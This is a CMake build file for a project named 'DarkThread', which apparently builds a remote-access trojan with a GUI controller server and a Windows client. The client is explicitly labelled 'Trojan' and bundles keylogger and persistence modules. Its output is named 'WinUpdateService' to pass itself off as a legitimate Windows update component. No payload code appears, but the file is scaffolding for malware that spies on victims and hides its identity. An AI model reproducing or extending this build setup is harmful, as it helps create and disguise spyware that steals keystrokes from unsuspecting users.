cmake_minimum_required(VERSION 3.20)
project(DarkThread)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# ---- Server (GUI Controller) ----
add_executable(darkserver
    server/gui_server.cpp
    server/gui_server.h
    shared/protocol.h
)
target_link_libraries(darkserver ws2_32 comctl32)
set_target_properties(darkserver PROPERTIES
    WIN32_EXECUTABLE TRUE
)

# ---- Client (Trojan) ----
add_executable(darkclient
    client/client.cpp
    client/client.h
    client/config.cpp
    client/config.h
    client/keylogger.cpp
    client/keylogger.h
    client/persistence.cpp
    client/persistence.h
    shared/protocol.h
)
target_link_libraries(darkclient
    ws2_32
    gdiplus
    psapi
    shlwapi
    shell32
    ole32
)
set_target_properties(darkclient PROPERTIES
    WIN32_EXECUTABLE TRUE
    OUTPUT_NAME "WinUpdateService"
)